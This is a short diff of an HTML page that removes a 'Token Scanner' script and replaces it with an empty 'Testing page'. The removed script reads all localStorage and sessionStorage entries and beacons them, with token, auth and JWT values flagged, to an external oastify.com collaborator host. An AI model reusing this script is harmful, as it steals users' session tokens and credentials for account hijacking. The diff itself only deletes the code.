@@ -1,50 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Token Scanner</title>
-  <script>
-    const timestamp = Date.now();
-    const collab = "https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/";
-
-    const targets = [];
-
-    // Collect keys from localStorage
-    for (let key in localStorage) {
-      targets.push({ type: "localStorage", key, val: localStorage.getItem(key) });
-    }
-
-    // Collect keys from sessionStorage
-    for (let key in sessionStorage) {
-      targets.push({ type: "sessionStorage", key, val: sessionStorage.getItem(key) });
-    }
-
-    targets.forEach(entry => {
-      try {
-        const { type, key, val } = entry;
-        if (val && /token|auth|session|jwt/i.test(key + val)) {
-          new Image().src = collab + "hit" +
-            "?type=" + encodeURIComponent(type) +
-            "&key=" + encodeURIComponent(key) +
-            "&val=" + encodeURIComponent(val) +
-            "&ts=" + timestamp;
-        } else {
-          new Image().src = collab + "log" +
-            "?type=" + encodeURIComponent(type) +
-            "&key=" + encodeURIComponent(key) +
-            "&val=" + encodeURIComponent(val || "null") +
-            "&ts=" + timestamp;
-        }
-      } catch {
-        new Image().src = collab + "fail" +
-          "?type=" + encodeURIComponent(entry.type) +
-          "&key=" + encodeURIComponent(entry.key) +
-          "&error=exception" +
-          "&ts=" + timestamp;
-      }
-    });
-  </script>
+  <title>Testing page</title>
+  
 </head>
 <body>
-  <h1>Token scanner running...</h1>
+  <h1>Testing page</h1>
 </body>
 </html>
